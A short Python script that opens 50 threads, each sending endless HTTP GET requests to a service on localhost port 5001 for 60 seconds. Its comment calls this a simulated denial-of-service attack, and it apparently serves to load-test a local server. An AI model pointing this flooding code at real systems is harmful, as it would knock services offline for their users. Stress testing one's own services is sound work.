import requests
import threading
import time

def dos_attack():
    while True:
        try:
            requests.get('http://localhost:5001')
        except:
            pass

# Start multiple threads to simulate DOS
threads = []
for i in range(50):
    t = threading.Thread(target=dos_attack)
    t.daemon = True
    threads.append(t)
    t.start()

# Run for 60 seconds
time.sleep(60) 